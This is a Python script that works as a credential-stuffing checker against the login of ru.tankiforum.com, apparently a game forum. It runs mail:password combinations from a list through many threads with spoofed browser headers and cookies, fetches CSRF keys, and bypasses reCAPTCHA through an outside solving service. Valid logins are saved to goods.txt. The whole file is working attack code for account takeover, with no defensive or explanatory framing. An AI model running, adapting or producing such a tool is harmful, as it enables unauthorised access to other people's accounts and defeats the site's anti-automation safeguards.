import concurrent.futures

import httpx

from modules.checker.capcha_solver import Capcha_Solver


def Checker(threads, base_file_path, captcha_key):
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for data in base_file_path:
            future = executor.submit(Check, data, captcha_key)
            futures.append(future)

        concurrent.futures.wait(futures)


def Check(data, captcha_key):
    try:
        string = data.split(':')
        mail = string[0]
        password = string[1]
    except IndexError:
        print(f'[{data}] - [ERROR] - [INDEX ERROR]')
        return

    with httpx.Client(follow_redirects=True, http2=True) as client, open('goods.txt', 'a') as goods, open('bads.txt', 'a') as bads:

        try:

            client.cookies.set('ips4_hasJS', 'true', domain='ru.tankiforum.com')
            client.cookies.set('_ym_uid', '1690873553402165514', domain='ru.tankiforum.com')
            client.cookies.set('_ym_d', '1690873553', domain='ru.tankiforum.com')
            client.cookies.set('_ym_isad', '2', domain='ru.tankiforum.com')
            client.cookies.set('TCK2', 'c55e9fd5b07e7ea3f1482be3f2a7bb11', domain='ru.tankiforum.com')

            response_start = client.get(
                url='https://ru.tankiforum.com/login/',
                headers={
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
                    'Accept': '*/*',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'ru-RU,ru;q=0.9'
                }
            )
            print(f'[{mail}] - [START] - [CODE: {response_start.status_code}]')
            if response_start.status_code == 202:
                print(f'[{mail}] - [ERROR] - [YANDEX METRICA COOCKIE DEAD]')
                exit(1)

            response_login = client.get(
                url='https://ru.tankiforum.com/login/?attempt=1',
                headers={
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
                    'Accept': '*/*',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'ru-RU,ru;q=0.9'
                }
            )
            print(f'[{mail}] - [LOGIN] - [CODE: {response_login.status_code}]')
            response_token = client.get(
                url='https://ru.tankiforum.com/index.php?app=core&module=system&controller=ajax&do=getCsrfKey&path=/login/',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
                    'Accept': '*/*',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://ru.tankiforum.com/index.php?',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'ru-RU,ru;'
                }
            )
            print(f'[{mail}] - [TOKEN] - [{response_token.json()["key"]}] - [CODE: {response_token.status_code}]')
            token = response_token.json()['key']

            while True:
                print(f'[{mail}] - [CAPTCHA] - [SOLVING]')
                captcha_token = Capcha_Solver(captcha_key)
                print(f'[{mail}] - [CAPTCHA] - [SOLVED]')
                response_auth = client.post(
                    url='https://ru.tankiforum.com/login',
                    headers={
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
                        'Accept': '*/*',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-User': '?1',
                        'Sec-Fetch-Dest': 'document',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'ru-RU,ru;q=0.9'
                    },

                    data={
                        'csrfKey': token,
                        'auth': mail,
                        'password': password,
                        'remember_me': '1',
                        'g-recaptcha-response': captcha_token,
                        '_processLogin': 'usernamepassword'
                    }
                )
                if 'Вы не прошли проверку капча.' in response_auth.text:
                    print(f'[{mail}] - [CAPTCHA] - [BAD] - [RETRYING]')
                else:
                    break

            if 'Неверный логин или пароль.' in response_auth.text:
                print(f'[{data}] - [LOGIN] - [BAD]')
                bads.write(f'{mail}:{password}\n')
                return

            else:
                print(f'[{data}] - [LOGIN] - [GOOD]')
                goods.write(f'{mail}:{password}\n')
                return

        except Exception as e:
            print(f'[{data}] - [ERROR] - [{e}]')
            return
